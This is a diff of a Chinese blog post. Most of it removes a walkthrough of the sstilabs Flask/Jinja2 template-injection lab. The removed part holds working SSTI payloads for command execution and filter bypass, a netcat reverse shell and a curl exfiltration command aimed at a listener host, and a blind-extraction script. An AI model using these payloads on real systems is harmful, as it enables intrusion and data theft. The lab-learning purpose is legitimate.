@@ -29,9 +29,8 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357782.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357586.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357320.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358781.png">
 <meta property="article:published_time" content="2025-07-13T14:36:00.000Z">
-<meta property="article:modified_time" content="2025-07-14T03:16:18.062Z">
+<meta property="article:modified_time" content="2025-07-14T04:26:29.807Z">
 <meta property="article:author" content="sangnigege">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary_large_image">
@@ -253,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.5k 字
+          631 字
         
       </span>
     
@@ -264,7 +263,7 @@
         
         
         
-          30 分钟
+          6 分钟
         
       </span>
     
@@ -371,387 +370,6 @@
 <td></td>
 <td><code>joiner</code></td>
 <td>Jinja2 的字符串拼接工具，自动处理分隔符（如逗号）。</td>
-<td>拼接列表：<code>&#123;% set j = joiner(", ") %&#125;&#123;% for item in list %&#125;&#123;&#123; j() &#125;&#125;&#123;&#123; item &#125;&#125;`。 |
-|              | `namespace`            | 用于在模板中创建变量命名空间，避免变量冲突。                 | 定义局部变量：`&#123;% ns = namespace(count=0) %&#125;`。              |
-|              | `config`               | 包含 Flask 应用的配置信息（如 `SECRET_KEY`、数据库连接等）。 | 读取配置：`&#123;&#123; config['SECRET_KEY'] &#125;&#125;`（需注意敏感信息泄露风险）。 |
-|              | `request`              | 封装当前 HTTP 请求的详细信息（参数、头、Cookies 等）。       | 获取 GET 参数：`&#123;&#123; request.args.get('id') &#125;&#125;`。              |
-|              | `session`              | 用于读写用户会话数据（基于 Cookie 加密存储）。               | 存储用户状态：`&#123;&#123; session['username'] &#125;&#125;`。                  |
-| **利用方法** | 调用 `current_app`     | 通过 `current_app` 访问应用上下文，可间接获取配置或扩展对象（如数据库连接）。 | 查看配置：`&#123;&#123; current_app.config['DEBUG'] &#125;&#125;`。              |
-|              | 绕过字符串过滤         | 利用 `request.args`、字符串拼接或 `chr()` 动态构造被过滤的关键字（如 `__class__`）。 | 构造 `__class__`：`&#123;&#123; ''['__cla' ~ 'ss__'] &#125;&#125;`。             |
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-**注意：**`.`可以与`['']`互相替换，比如`__globals__['os']`可以换为`__globals__.os`，所以下面两句是等价的
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__.os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-![image-20250215214438190](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357234.png)
-
-# Level 2
-
-这关过滤&#123;&#123;&#125;&#125;，我们可以用&#123;%%&#125;代替，但是要注意使用print输出
-
-`&#123;%print lipsum.__globals__.os.popen('cat flag').read()%&#125;`
-
-或者
-
-`&#123;%print(lipsum.__globals__.os.popen('cat flag').read())%&#125;`
-
-![image-20250215215323534](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359767.png)
-
-# Level 3
-
-这一关没回显。
-
-这种情况下我们往往考虑三种方法：
-
-1. 反弹shell
-
-2. 带外注入（DNSlog、wget等）
-
-3. 盲注
-
-我们每种都试一下。
-
-**第一种方法，**
-
-先在kali上开启监听`nc -lvp 7777`
-
-然后执行`&#123;&#123;lipsum.__globals__.os.popen('nc 192.168.230.133 7777 -e /bin/bash')&#125;&#125;`
-
-![image-20250714000047751](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507140000471.png)
-
-反弹shell成功
-
-![image-20250215220409424](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358843.png)
-
-**第二种方法，**
-
-sstilabs应该是不出网的，用DNSlog有些困难了
-
-这里在kali里用python开启一个http服务
-
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
-
-然后去访问
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.os.popen(<span class="hljs-string">&#x27;curl http://192.168.230.133/`cat flag | xxd -p`&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-![image-20250215222441088](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358397.png)
-
-这里一开始单纯使用`cat flag`，但是发现特殊符号会消失（比如&#123;&#125;），所以改为16进制输出`cat flag | xxd -p`
-
-![image-20250215222627980](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358267.png)
-
-**第三种，**
-
-这里直接写出脚本
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">payload</span>):<br>    postdata = &#123;<br>        <span class="hljs-string">&#x27;code&#x27;</span>: payload<br>    &#125;<br>    start_time = time.time()<br>    response = requests.post(url, data=postdata)<br>    end_time = time.time()<br>    elapsed_time = end_time - start_time<br>    <span class="hljs-comment"># 如果响应时间超过1秒，则认为条件为真</span><br>    <span class="hljs-keyword">if</span> elapsed_time &gt; <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>password = <span class="hljs-string">&#x27;&#x27;</span><br>s = <span class="hljs-string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-comment"># 使用时间盲注的payload，通过执行系统命令 sleep 1 来引入延迟</span><br>        payload = <span class="hljs-string">&#x27;&#123;% if lipsum.__globals__.os.popen(&quot;cat flag&quot;).read()[&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;] == &quot;&#x27;</span> + c + <span class="hljs-string">&#x27;&quot; and lipsum.__globals__.os.popen(&quot;sleep 1&quot;).read() %&#125;&#123;% endif %&#125;&#x27;</span><br>        <span class="hljs-keyword">if</span> check(payload):<br>            password += c<br>            <span class="hljs-built_in">print</span>(password)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(password)<br><span class="hljs-comment">#需要修改URL和postdata</span><br></code></pre></td></tr></table></figure>
-
-![image-20250215224842500](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358176.png)
-
-# Level 4
-
-这一关过滤中括号
-
-我们第一关提到：`.`可以与`['']`互相替换，比如`__globals__['os']`可以换为`__globals__.os`，其实，`['']`还可以用`__getintm__('')`替换，即`__globals__['os']`可以换为`__globals__.__getitem__('os')`。此外还有更多的方法，这里把常见的获取键值或下标的方式进行总结（可以知道，这些都是等价的）。
-
-**获取键值或下标的方式**（下面的\_\_builtins\_\_及0仅作为例子，实际应用请更换）
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">dict</span>.__builtins__<br><span class="hljs-built_in">dict</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br><span class="hljs-built_in">dict</span>.get(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">dict</span>.pop(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">dict</span>.__getitem__(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">dict</span>.setdefault(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><br><span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">list</span>.__getitem__(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">list</span>.pop(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
-
-**获取属性的方式**
-
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure>
-
-payload之一`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`中虽然本来就没有中括号，
-
-但是第一关提到的`&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;`中有，
-
-根据上面，我们可以换为（其中，pop要谨慎使用，使用一次就会弹出，所以仅有一次机会，这里不建议使用）：
-
-<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.get</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.pop</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.__getitem__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.setdefault</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-可知，上面6句都是等价的。
-
-![image-20250216105441416](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358458.png)
-
-
-
-# Level 5
-
-过滤单双引号
-
-这里我们要引入`request`：`request` 在 Flask 中可以访问基于 HTTP 请求传递的所有信息。
-
-此 `request` 并非 Python 的函数，而是在 Flask 内部的函数。
-
-| 属性/方法               | 描述                                                         |
-| ----------------------- | ------------------------------------------------------------ |
-| `request.args.key`      | 获取 GET 请求中传入的 `key` 的值。                           |
-| `request.values.参数名` | 获取所有参数（包括 GET 和 POST）。                           |
-| `request.cookies`       | 获取传入的 cookies 参数。                                    |
-| `request.headers`       | 获取请求头中的参数。                                         |
-| `request.form.key`      | 获取 POST 请求中传入的 `key` 的值（`Content-Type` 为 `application/x-www-form-urlencoded` 或 `multipart/form-data`）。 |
-| `request.data`          | 获取 POST 请求中传入的参数（`Content-Type:a/b` ）。          |
-| `request.json`          | 获取 POST 请求中传入的 JSON 参数（`Content-Type` 为 `application/json`）。 |
-
-我们这里试试GET的
-
-我们的payload`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`中系统命令处有引号，所以我们替换为
-
-`&#123;&#123;lipsum.__globals__.os.popen(request.args.k1).read()&#125;&#125;`
-
-<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358781.png" srcset="/img/loading.gif" lazyload alt="image-20250216114325149" style="zoom:67%;" />
-
-试试POST
-
-`code=&#123;&#123;lipsum.__globals__.os.popen(request.form.x1).read()&#125;&#125;&x1=cat flag`
-
-![image-20250216114210921](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358898.png)
-
-# Level 6
-
-这关过滤下划线
-
-这里我们讲一下flask常用过滤器：
-
-| flask常用过滤器          | 描述                                                         |
-| ------------------------ | ------------------------------------------------------------ |
-| `length()`               | 获取一个序列或者字典的长度并将其返回。                       |
-| `int()`                  | 将值转换为 `int` 类型。                                      |
-| `float()`                | 将值转换为 `float` 类型。                                    |
-| `lower()`                | 将字符串转换为小写。                                         |
-| `upper()`                | 将字符串转换为大写。                                         |
-| `reverse()`              | 反转字符串。                                                 |
-| `replace(value,old,new)` | 将 `value` 中的 `old` 替换为 `new`。                         |
-| `list()`                 | 将变量转换为列表类型。                                       |
-| `string()`               | 将变量转换成字符串类型。                                     |
-| `join()`                 | 将一个序列中的参数值拼接成字符串，通常与 Python 内置的 `dict()` 配合使用。 |
-| `attr()`                 | 获取对象的属性。                                             |
-
-过滤器通过管道符号 (`|`) 与变量连接，并且在括号中可能有可选的参数。
-
-应对过滤下划线，我们以下几种方法：
-
-1. 使用request方法（结合过滤器attr）
-
-2. 使用hex编码
-
-3. 使用unicode编码
-
-4. 使用base64编码(不建议用，仅python2支持)
-
-5. 格式化字符串
-
-`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`中有`__globals__`
-
-**第1种，**
-
-这里我们需要使用过滤器attr，所以应该将
-
-`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`
-
-换为
-
-`&#123;&#123;lipsum.__globals__.__getitem__('os').popen('ls').read()&#125;&#125;`
-
-然后再转换
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum|attr(request.args.<span class="hljs-built_in">globals</span>)|attr(request.args.getitem)(<span class="hljs-string">&#x27;os&#x27;</span>)|attr(<span class="hljs-string">&#x27;popen&#x27;</span>)(<span class="hljs-string">&#x27;ls&#x27;</span>)|attr(<span class="hljs-string">&#x27;read&#x27;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-注意GET传参`?globals=__globals__&getitem=__getitem__`
-
-**第2种，**
-
-`_`编码后为`\x5f`
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>].os.popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-**第3种，**
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;\u005f\u005fglobals\u005f\u005f&#x27;</span>].os.popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum|attr(<span class="hljs-string">&quot;\u005f\u005fglobals\u005f\u005f&quot;</span>)|attr(<span class="hljs-string">&quot;\u005f\u005fgetitem\u005f\u005f&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;cat flag&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-**第4种，**
-
-（不建议，这里不好使）
-
-<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&#x27;X19jbGFzc19f&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19iYXNlX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19zdWJjbGFzc2VzX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))()|attr(<span class="hljs-name">&#x27;X19nZXRpdGVtX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))(<span class="hljs-name">213</span>)|attr(<span class="hljs-name">&#x27;X19pbml0X18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19nbG9iYWxzX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))|attr(<span class="hljs-name">&#x27;X19nZXRpdGVtX18=&#x27;.decode</span>(<span class="hljs-name">&#x27;base64&#x27;</span>))(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat flag&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-**第5种，**
-
-<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>[&quot;%c%cglobals%c%c&quot;%(95,95,95,95)].os.popen(<span class="hljs-name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;%c%cglobals%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))|attr(<span class="hljs-name">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-# Level 7
-
-过滤点
-
-我们有两种方法：
-
-1. 用中括号代替点（见第四关）
-2. 用attr()绕过
-
-**第一种，**
-
-`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`
-
-改为
-
-`&#123;&#123;lipsum['__globals__']['os']['popen']('ls')['read']()&#125;&#125;`
-
-<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#123;&#123;lipsum[<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>5f<span class="hljs-char escape_">\x</span>5f<span class="hljs-char escape_">\x</span>67<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>62<span class="hljs-char escape_">\x</span>61<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>73<span class="hljs-char escape_">\x</span>5f<span class="hljs-char escape_">\x</span>5f&#x27;</span>][<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>73&#x27;</span>][<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>70<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>70<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>6e&#x27;</span>](<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>73&#x27;</span>)[<span class="hljs-string">&#x27;<span class="hljs-char escape_">\x</span>72<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>61<span class="hljs-char escape_">\x</span>64&#x27;</span>]()&#125;&#125;<br>__globals__ <span class="hljs-number">5</span>F5F676C6F62616C735F5F \x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f<br>os <span class="hljs-number">6</span>F73 \x6f\x73<br>popen <span class="hljs-number">706</span>F70656E \x70\x6f\x70\x65\x6e<br>ls <span class="hljs-number">6</span>C73 \x6c\x73<br>read <span class="hljs-number">72656164</span> \x72\x65\x61\x64<br></code></pre></td></tr></table></figure>
-
-
-
-**第二种，**
-
-<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__getitem__&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;ls&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;\u005f\u005fglobals\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005fgetitem\u005f\u005f&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;%c%cglobals%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))|attr(<span class="hljs-name">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-# Level 8
-
-过滤关键字`“class”, “arg”, “form”, “value”, “data”, “request”, “init”, “global”, “open”, “mro”, “base”, “attr”`
-
-这里有5种方法：
-
-1. 字符编码
-2. 字符拼接
-3. 使用Jinja2中的`~`拼接
-4. 使用过滤器（reverse反转、replace替换、join拼接）
-5. 利用python的char()
-
-**第一种**前面用过，这里就不再提了
-
-**第二种，**
-
-`&#123;&#123;lipsum['__globals__']['os']['popen']('ls')['read']()&#125;&#125;`
-
-改为
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;__glo&#x27;</span><span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br><br>&#123;&#123;lipsum[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;pop&#x27;</span>+<span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-**第三种，**
-
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__glo&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;bals__&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;po&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">d</span>=<span class="hljs-string">&#x27;pen&#x27;</span>%&#125;&#123;&#123;lipsum[a~b][<span class="hljs-string">&#x27;os&#x27;</span>][c~d](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-**第四种，**
-
-<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=<span class="hljs-string">&quot;__slabolg__&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=<span class="hljs-string">&quot;nepop&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;lipsum[a][<span class="hljs-string">&#x27;os&#x27;</span>][b](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=<span class="hljs-string">&quot;__gmmbals__&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">replace</span>(<span class="hljs-string">&quot;mm&quot;</span>,<span class="hljs-string">&quot;lo&quot;</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=<span class="hljs-string">&quot;pommn&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">replace</span>(<span class="hljs-string">&quot;mm&quot;</span>,<span class="hljs-string">&quot;pe&quot;</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;lipsum[a][<span class="hljs-string">&#x27;os&#x27;</span>][b](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-**第五种，**
-
-从内置函数里面获取 ASCII 解码功能，并赋值给变量 chr，从而使得chr变为可以ASCII 解码的函数
-
-原理大概是这样，但下面payload有问题，并不好使
-
